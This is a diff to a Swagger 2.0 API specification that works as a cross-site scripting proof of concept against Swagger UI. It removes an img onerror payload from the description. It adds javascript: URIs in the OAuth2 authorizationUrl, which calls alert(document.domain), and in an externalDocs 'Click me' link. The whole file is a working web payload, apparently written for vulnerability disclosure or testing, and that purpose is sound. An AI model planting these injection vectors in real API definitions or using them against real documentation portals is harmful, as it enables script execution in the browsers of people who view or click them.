@@ -1,11 +1,24 @@
 swagger: '2.0'
 info:
+  title: "XSS OAuth2"
   version: "1.0.0"
-  title: PoC
-  description: <img src=x onerror=alert('SwaggerXSS')>
+  description: |
+    <b>OAuth2 PoC</b>
+securityDefinitions:
+  oauth2:
+    type: "oauth2"
+    authorizationUrl: "javascript:alert(document.domain)"
+    flow: "implicit"
+    scopes:
+      read: "read access"
+security:
+  - oauth2: [read]
 paths:
   /:
     get:
       responses:
         200:
           description: OK
+externalDocs:
+  description: "Click me"
+  url: "javascript:alert(1)"
